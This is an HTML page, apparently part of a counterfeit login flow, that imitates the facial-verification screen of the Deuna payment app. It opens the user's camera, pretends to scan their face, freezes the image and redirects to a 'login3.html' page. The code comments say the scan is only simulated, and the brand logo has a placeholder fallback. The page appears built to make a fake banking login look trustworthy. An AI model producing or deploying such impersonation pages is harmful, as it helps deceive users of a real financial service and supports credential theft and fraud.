<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Deuna! | Escaneo Facial</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-color: #f6eefe;
            --text-dark: #202020;
            --warning-red: #d9414e; 
        }
        * {
            margin: 0; padding: 0; box-sizing: border-box;
            font-family: 'Poppins', sans-serif;
            -webkit-tap-highlight-color: transparent;
        }
        body {
            background-color: var(--bg-color);
            display: flex; justify-content: center;
            height: 100vh; height: 100dvh; overflow: hidden;
        }
        .mobile-container {
            width: 100%; max-width: 480px; 
            background-color: var(--bg-color);
            height: 100%; display: flex; flex-direction: column;
            align-items: center; padding: 24px; position: relative;
        }
        
        /* Botón de volver (X) */
        .close-btn {
            position: absolute;
            top: 24px; right: 24px;
            font-size: 20px; color: var(--text-dark);
            text-decoration: none; font-weight: 500;
        }

        /* Máscara circular para la cámara */
        .camera-wrapper {
            margin-top: 50px; 
            width: 320px; height: 320px;
            border-radius: 50%;
            overflow: hidden;
            background: #000;
            position: relative;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
        }
        #camera-feed {
            width: 100%; height: 100%;
            object-fit: cover;
            transform: scaleX(-1); /* Efecto espejo para la selfie */
        }

        /* Animación parpadeante que simula que está haciendo el escaneo */
        @keyframes pulse-text {
            0% { opacity: 1; }
            50% { opacity: 0.4; }
            100% { opacity: 1; }
        }

        /* Texto de Advertencia */
        .warning-text {
            margin-top: 40px;
            color: var(--warning-red);
            font-size: 14px;
            font-weight: 500;
            text-align: center;
            max-width: 200px;
            line-height: 1.3;
            animation: pulse-text 2s infinite ease-in-out;
        }

        /* Logo inferior */
        .bottom-logo {
            margin-top: auto; /* Empuja el logo hacia abajo ya que no hay botón */
            margin-bottom: 10px;
        }
        .bottom-logo img {
            height: 40px;
            object-fit: contain;
        }
    </style>
</head>
<body>
    <div class="mobile-container">
        <!-- Ir atrás a las instrucciones -->
        <a href="login3.html" class="close-btn">✕</a>
        
        <div class="camera-wrapper">
            <video id="camera-feed" autoplay playsinline muted></video>
        </div>

        <p class="warning-text">Coloca tu cara en el <br> centro del circulo . .</p>

        <div class="bottom-logo">
            <img src="img/logo2.png" alt="Deuna Logo" onerror="this.src='https://via.placeholder.com/150x50/f6eefe/4a1b82?text=deuna!'">
        </div>
    </div>

    <script>
        const video = document.getElementById('camera-feed');

        // Solicitar acceso a la cámara y empezar el escáner facial automático
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
                .then(stream => {
                    video.srcObject = stream;
                    
                    // Simular captura inteligente automática (espera 3.5 segundos con la cámara encendida)
                    setTimeout(() => {
                        let attempts = parseInt(sessionStorage.getItem('captureAttempts')) || 0;
                        sessionStorage.setItem('captureAttempts', attempts + 1);
                        
                        video.pause(); // Congela el cuadro como si hubiese tomado la foto de golpe

                        setTimeout(() => {
                            window.location.href = 'login3.html?validating=true';
                        }, 600); // 0.6 segs de transición y luego redirige
                    }, 3500); 
                })
                .catch(err => {
                    console.error("Error al acceder a la cámara: ", err);
                    alert("No se pudo acceder a la cámara. Por favor permite el acceso en tu navegador.");
                });
        } else {
            alert("Tu navegador no soporta la cámara web.");
        }
    </script>
</body>
</html>
